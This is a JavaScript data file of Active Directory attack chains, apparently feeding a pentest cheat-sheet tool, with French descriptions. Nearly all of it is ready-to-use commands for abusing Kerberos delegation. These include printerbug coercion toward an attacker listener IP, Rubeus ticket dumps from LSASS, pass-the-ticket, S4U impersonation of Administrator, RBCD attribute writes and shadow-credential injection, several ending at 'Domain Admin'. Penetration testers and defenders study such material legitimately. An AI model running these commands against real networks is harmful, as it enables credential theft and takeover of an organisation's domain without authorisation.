export const KERBEROS_DELEGATION_DATA = [
  {
    name: 'Find Delegation',
    nodes: [
      { 
        label: 'Find Delegation (Impacket)', 
        cmd: 'findDelegation.py <domain>/<user>:<password>', 
        leadsTo: 'Delegation Info',
        description: 'Scanne le domaine pour trouver tous les comptes (utilisateurs et ordinateurs) avec des drapeaux de délégation activés.'
      },
      { 
        label: 'Unconstrained (BloodHound)', 
        cmd: 'MATCH (c:Computer {unconstraineddelegation:true}) RETURN c', 
        leadsTo: 'Target List',
        description: 'Requête Cypher pour trouver les ordinateurs où la délégation sans contrainte est activée (TGT stocké en mémoire).'
      },
      { 
        label: 'Constrained (BloodHound)', 
        cmd: 'MATCH p=(u:User)-[:AllowedToDelegate]->(c:Computer) RETURN p', 
        leadsTo: 'Target List',
        description: 'Requête Cypher pour visualiser les délégations contraintes (S4U2Proxy) configurées.'
      }
    ]
  },
  {
    name: 'Unconstrained Delegation',
    nodes: [
      { 
        label: 'SpoolSample (Coerce)', 
        cmd: 'printerbug.py <domain>/<user>:<pass>@<target_unconstrained_server> <attacker_listener_ip>', 
        leadsTo: 'TGT Capture',
        description: 'Force un DC à s\'authentifier sur le serveur compromis (en délégation sans contrainte) pour capturer son TGT en mémoire.'
      },
      { 
        label: 'Rubeus Dump', 
        cmd: 'Rubeus.exe dump /service:krbtgt /nowrap', 
        leadsTo: 'TGT Ticket',
        description: 'Exporte les tickets TGT des utilisateurs connectés (dont celui du DC capturé) depuis la mémoire LSASS.'
      },
      { 
        label: 'Pass-The-Ticket', 
        cmd: 'Rubeus.exe ptt /ticket:<base64_ticket>', 
        leadsTo: 'Domain Admin',
        description: 'Injecte le TGT capturé dans la session courante pour impersonner la victime (ex: DC$).'
      }
    ]
  },
  {
    name: 'Constrained Delegation (S4U2Self + S4U2Proxy)',
    nodes: [
      { 
        label: 'Get Service Ticket (Impacket)', 
        cmd: 'getST.py -spn <target_spn> -impersonate Administrator -dc-ip <dc_ip> <domain>/<delegating_user>:<password>', 
        leadsTo: 'Admin Service Ticket',
        description: 'Utilise les extensions S4U Kerberos pour demander un ticket de service pour l\'administrateur vers le service cible autorisé.'
      },
      { 
        label: 'Rubeus S4U', 
        cmd: 'Rubeus.exe s4u /user:<user> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<target_spn> /ptt', 
        leadsTo: 'Admin Access',
        description: 'Exécute la chaîne S4U complète (Self + Proxy) et injecte le ticket final pour accéder au service cible en tant qu\'Admin.'
      }
    ]
  },
  {
    name: 'RBCD (Resource Based Constrained Delegation)',
    nodes: [
      { 
        label: 'Configure RBCD (Impacket)', 
        cmd: 'rbcd.py -delegate-from <fake_pc$> -delegate-to <target_pc$> -action write -u <user> -p <pass> -d <domain>', 
        leadsTo: 'Delegation Configured',
        description: 'Si on a WriteDACL/GenericAll sur la cible, on configure son attribut msDS-AllowedToActOnBehalfOfOtherIdentity pour autoriser notre faux PC.'
      },
      { 
        label: 'Get ST via RBCD', 
        cmd: 'getST.py -spn cifs/<target_pc> -impersonate Administrator -dc-ip <dc_ip> <domain>/<fake_pc$>:<fake_pass>', 
        leadsTo: 'CIFS Admin Ticket',
        description: 'Utilise le compte machine contrôlé pour demander un ticket de service Administrateur vers la cible via S4U.'
      }
    ]
  },
  {
    name: 'Shadow RBCD (Without Account)',
    nodes: [
      { 
        label: 'Add Shadow Creds (PyWhisker)', 
        cmd: 'pywhisker.py -d <domain> -u <user> -p <pass> --target <target_pc$> --action "add" --filename "key.pfx"', 
        leadsTo: 'Cert Auth',
        description: 'Injecte un certificat sur le compte machine cible via msDS-KeyCredentialLink (si droits suffisants).'
      },
      { 
        label: 'Rubeus AskTGT', 
        cmd: 'Rubeus.exe asktgt /user:<target_pc$> /certificate:key.pfx /password:<cert_pass> /nowrap', 
        leadsTo: 'TGT Machine',
        description: 'Demande un TGT pour le compte machine cible en utilisant le certificat injecté (PKINIT).'
      },
      { 
        label: 'Rubeus S4U / Self', 
        cmd: 'Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/target.domain.local /ticket:<tgt_base64> /ptt', 
        leadsTo: 'Admin Access',
        description: 'Utilise le TGT machine obtenu pour s\'impersonner Administrateur sur soi-même (S4U2Self) et accéder aux services.'
      }
    ]
  }
];